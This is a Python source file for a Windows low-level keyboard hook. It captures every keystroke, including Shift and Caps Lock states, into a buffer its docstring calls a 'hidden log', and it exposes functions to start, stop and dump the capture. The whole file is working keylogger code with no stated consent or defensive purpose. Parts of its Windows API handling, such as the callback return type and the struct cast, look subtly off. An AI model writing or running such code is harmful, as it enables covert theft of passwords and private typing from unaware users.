"""
Low-level keyboard hook using SetWindowsHookEx (WH_KEYBOARD_LL).
Captures keystrokes, handles modifier keys, and writes to a hidden log.
"""
import ctypes
from ctypes import wintypes
import sys
import time
import os
import threading

# Windows API constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

# Virtual key codes for special handling
VK_SHIFT = 0x10
VK_CONTROL = 0x11
VK_MENU = 0x12  # Alt
VK_CAPITAL = 0x14
VK_RETURN = 0x0D
VK_BACK = 0x08
VK_TAB = 0x09
VK_ESCAPE = 0x1B
VK_SPACE = 0x20

# Load user32 and kernel32
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Hook handle and message pump
hook_handle = None
stop_event = threading.Event()
log_buffer = []
log_lock = threading.Lock()

def key_event_to_str(vk_code, shift_pressed, caps_on):
    """Convert virtual key code and modifiers to string."""
    # Use MapVirtualKey to get scan code, then ToUnicode for char
    # Simplified mapping for common keys
    buf = ctypes.create_unicode_buffer(256)
    keyboard_state = (ctypes.c_ubyte * 256)()
    if shift_pressed:
        keyboard_state[VK_SHIFT] = 0x80
    if caps_on:
        keyboard_state[VK_CAPITAL] = 0x01

    # Get keyboard layout
    layout = user32.GetKeyboardLayout(0)
    scan_code = user32.MapVirtualKeyEx(vk_code, 0, layout)

    result = user32.ToUnicodeEx(vk_code, scan_code, keyboard_state, buf, 256, 0, layout)
    if result > 0:
        return buf.value
    # Fallback special keys
    if vk_code == VK_RETURN:
        return '[ENTER]\n'
    elif vk_code == VK_BACK:
        return '[BACKSPACE]'
    elif vk_code == VK_TAB:
        return '[TAB]'
    elif vk_code == VK_ESCAPE:
        return '[ESC]'
    elif vk_code == VK_SPACE:
        return ' '
    else:
        return f'[VK_{vk_code}]'

def low_level_keyboard_proc(nCode, wParam, lParam):
    """Hook callback function."""
    if nCode >= 0:
        if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
            kb = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulonglong * 4))
            vk_code = kb.contents[0]
            # Check shift / caps state
            shift = (user32.GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0
            caps = (user32.GetKeyState(VK_CAPITAL) & 0x0001) != 0
            key_str = key_event_to_str(vk_code, shift, caps)
            with log_lock:
                log_buffer.append(key_str)
    return user32.CallNextHookEx(hook_handle, nCode, wParam, lParam)

# Set up the callback type
HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
hook_callback = HOOKPROC(low_level_keyboard_proc)

def start_hook():
    global hook_handle
    hmod = kernel32.GetModuleHandleW(None)
    hook_handle = user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_callback, hmod, 0)
    if not hook_handle:
        raise ctypes.WinError()
    # Message loop
    msg = wintypes.MSG()
    while not stop_event.is_set():
        if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):  # PM_REMOVE
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
        else:
            time.sleep(0.01)
    # Unhook
    user32.UnhookWindowsHookEx(hook_handle)

def stop_hook():
    stop_event.set()

def dump_buffer():
    """Return accumulated keystrokes and clear buffer."""
    with log_lock:
        data = ''.join(log_buffer)
        log_buffer.clear()
    return data